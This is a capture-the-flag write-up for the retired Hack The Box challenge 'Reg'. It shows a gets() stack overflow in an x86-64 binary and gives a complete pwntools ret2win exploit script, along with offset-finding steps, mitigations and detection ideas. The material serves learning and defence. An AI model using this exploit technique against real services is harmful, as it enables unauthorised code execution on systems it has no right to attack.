---
challenge: Reg
category: Challenge
type: pwn
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, ret2win, x86-64, pwntools, gdb]
---

# Reg — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no flags or real credentials.

## TL;DR

A textbook stack overflow. `run()` reads the name with `gets()` into a `0x30`-byte buffer, so 56 bytes fill the frame and the next 8 overwrite the return pointer. The binary is not PIE and ships a `winner()` function that opens `flag.txt`, reads it and prints it: no shellcode or ROP needed, just return into that fixed address.

## Brief and surface

- **Pwn** category, **Easy** difficulty, a downloadable x86-64 ELF and a remote instance over `nc`.
- The `reg` binary is shipped without `strip`, so symbols are available.
- The description gives no technical hint: it is the usual "register" form with a name field.

```bash
file reg
checksec --file=reg
```

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

## Recon

```bash
chmod +x reg
./reg
```

```text
Enter your name: test
Registered!
```

No menu, no options: one `read` from stdin and a message. The rest only shows up in the disassembly.

```bash
nm -C reg | grep -iE " (run|winner)$"
objdump -d -M intel reg | sed -n '/<run>:/,/^$/p'
```

## Source analysis

`run()` reserves `0x30` bytes and calls `gets` on the buffer:

```asm
<run>:
  push   rbp
  mov    rbp,rsp
  sub    rsp,0x30
  lea    rdi,[rip+...]        ; "Enter your name: "
  call   puts
  lea    rax,[rbp-0x30]
  mov    rdi,rax
  call   gets                 ; no length limit
  lea    rdi,[rip+...]        ; "Registered!"
  call   puts
  leave
  ret
```

`gets` does not know the destination size and keeps reading until the newline: that is the bug, and it is reachable unauthenticated because it is the program's only input.

A separate `winner()` exists and nothing calls it:

```asm
<winner>:
  ...
  lea    rdi,[rip+...]        ; "Congratulations!"
  call   puts
  lea    rsi,[rip+...]        ; "r"
  lea    rdi,[rip+...]        ; "flag.txt"
  call   fopen
  ...
  call   fgets
  call   puts
```

## The bug

The `run()` frame looks like this:

```text
rbp-0x30  [ 48-byte buffer ]      <- gets writes without a limit
rbp+0x00  [ saved RBP, 8 bytes ]  <- overwritten with 8 more bytes
rbp+0x08  [ return address    ]   <- next target
```

`0x30` bytes fill the buffer, 8 more overwrite the saved RBP, and the next 8 land on the return pointer. When `ret` runs, the program jumps wherever that address points.

There is no canary to catch it, no PIE forcing an address leak, and `winner()` is already inside the binary: the technique is called **ret2win** and here it is the intended path, not a shortcut.

## Local reproduction

```bash
gdb -q ./reg
```

```gdb
gef> pattern create 200
gef> run
# paste the pattern at "Enter your name"
gef> pattern search $rsp
```

The offset comes out as `0x38` (48 buffer + 8 saved RBP). To confirm the function address:

```bash
objdump -d reg | grep "<winner>:"      # 0x401206
```

Alternative without GDB, using `pwntools`:

```python
from pwn import *
context.binary = elf = ELF('./reg')
p = process('./reg')
p.sendlineafter(b':', cyclic(200))
p.wait()
offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
print(hex(offset), hex(elf.symbols['winner']))
```

## Exploitation

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./reg')
HOST, PORT = '<IP>', <PORT>

payload  = b'A' * 0x30        # buffer
payload += b'B' * 0x8         # saved RBP
payload += p64(elf.symbols['winner'])

p = remote(HOST, PORT)
p.sendlineafter(b':', payload)
print(p.recvall(timeout=5).decode(errors='replace'))
```

Things that must be right:

- `p64` writes the integer in **little endian**; by hand the bytes are `06 12 40 00 00 00 00 00`.
- Jumping into `winner()` needs a 16-byte aligned stack. If the `ret` dies on a `movaps`, prepend a bare `ret` (`p64(rop.ret.address)`).
- The offset does not change remotely because the binary is identical; a rebuild would require recalculating it.

Proof of execution is the `winner()` message followed by the contents of `flag.txt`.

## Evidence

- `checksec` showing `NX enabled` and `No PIE`.
- `cyclic` pattern and the `0x38` offset in GDB.
- Local exploit output with a test flag, never the real one.

## Lessons learned

- `gets` is not "dangerous in the abstract": dropping the limit turns any buffer into a trivial overflow.
- The saved RBP occupies 8 bytes between buffer and return; forgetting it shifts the payload and the jump lands on garbage.
- Before building a ROP chain, list the symbols: a function that prints the flag saves the whole chain.
- `p64` and `cyclic_find` remove endianness and offset arithmetic mistakes.
- A `movaps` crash when jumping into a libc function is stack alignment, not a broken payload.

## Mitigations and detection

- Replace `gets` with a bounded `fgets` (or `getline`); `gets` was removed from C11 for exactly this reason.
- Build with `-fstack-protector-strong`, `-pie -fPIE` and `-Wl,-z,relro,-z,now`; canary plus PIE makes ret2win non-trivial.
- Do not ship debug functions that print sensitive files.
- Detection in a real service: `SIGSEGV` crashes with `RIP` pointing inside the binary, requests carrying cyclic strings (`Aa0Aa1...`) and repeated cores on the same endpoint.
- References: CWE-121 (stack-based buffer overflow), MITRE T1190 (exploit public-facing application).

## References

- <https://www.hackthebox.com/challenges/reg>
- <https://blackfell.net/technical/labs/HTB-pwn-reg>
- <https://cwe.mitre.org/data/definitions/121.html>
- <https://docs.pwntools.com/en/stable/elf/elf.html>
- <https://man7.org/linux/man-pages/man3/gets.3.html>
